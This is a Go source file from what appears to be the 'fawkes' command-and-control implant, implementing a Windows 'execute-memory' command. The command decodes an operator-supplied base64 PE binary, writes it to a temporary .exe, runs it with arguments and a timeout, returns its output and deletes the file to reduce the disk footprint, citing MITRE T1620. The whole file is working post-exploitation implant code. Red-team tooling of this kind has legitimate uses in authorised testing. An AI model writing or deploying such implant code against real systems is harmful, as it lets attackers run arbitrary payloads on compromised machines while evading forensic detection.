//go:build windows

package commands

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// executeMemoryArgs is shared with execute_memory_linux.go and execute_memory_darwin.go
// (duplicated due to build tags).
type executeMemoryArgs struct {
	BinaryB64 string `json:"binary_b64"` // base64-encoded PE binary
	Arguments string `json:"arguments"`  // command-line arguments (space-separated)
	Timeout   int    `json:"timeout"`    // execution timeout in seconds (default: 60)
}

// ExecuteMemoryCommand executes a PE binary with minimal disk footprint on Windows.
// Uses a temp file that is deleted immediately after process completion.
// MITRE T1620 — Reflective Code Loading
type ExecuteMemoryCommand struct{}

func (c *ExecuteMemoryCommand) Name() string { return "execute-memory" }
func (c *ExecuteMemoryCommand) Description() string {
	return "Execute a PE binary with minimal disk footprint — temp file is removed immediately after execution (T1620)"
}

func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: binary_b64 parameter required (base64-encoded PE binary)")
	}

	var args executeMemoryArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.BinaryB64 == "" {
		return errorResult("Error: binary_b64 is empty")
	}

	binaryData, err := base64.StdEncoding.DecodeString(args.BinaryB64)
	if err != nil {
		return errorf("Error decoding binary: %v", err)
	}

	if len(binaryData) < 64 {
		return errorResult("Error: binary data too small to be a valid PE")
	}

	if !isValidPE(binaryData) {
		return errorResult("Error: not a valid PE binary (missing MZ/PE signature)")
	}

	timeout := args.Timeout
	if timeout <= 0 {
		timeout = 60
	}

	// Create temp file with .exe extension (required for Windows to execute)
	tmpFile, err := os.CreateTemp("", "*.exe")
	if err != nil {
		return errorf("Error creating temp file: %v", err)
	}
	tmpPath := tmpFile.Name()

	// Write the PE binary
	if _, err := tmpFile.Write(binaryData); err != nil {
		tmpFile.Close()
		os.Remove(tmpPath)
		return errorf("Error writing binary: %v", err)
	}
	tmpFile.Close()

	// Parse command-line arguments
	var cmdArgs []string
	if args.Arguments != "" {
		cmdArgs = strings.Fields(args.Arguments)
	}

	// Execute with timeout
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, tmpPath, cmdArgs...)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	execErr := cmd.Run()
	os.Remove(tmpPath) // Clean up after execution completes

	// Build output from stdout + stderr
	var sb strings.Builder
	if stdout.Len() > 0 {
		sb.WriteString(stdout.String())
	}
	if stderr.Len() > 0 {
		if sb.Len() > 0 {
			sb.WriteString("\n")
		}
		sb.WriteString("[stderr] ")
		sb.WriteString(stderr.String())
	}

	if execErr != nil {
		if ctx.Err() == context.DeadlineExceeded {
			sb.WriteString(fmt.Sprintf("\n[Process timed out after %ds]", timeout))
		}
		output := sb.String()
		if output == "" {
			output = fmt.Sprintf("Error executing binary: %v", execErr)
		}
		return structs.CommandResult{
			Output:    output,
			Status:    "error",
			Completed: true,
		}
	}

	output := sb.String()
	if output == "" {
		output = fmt.Sprintf("[+] Binary executed successfully (%d bytes, no output)", len(binaryData))
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

// isValidPE is defined in execute_memory_helpers.go (cross-platform)
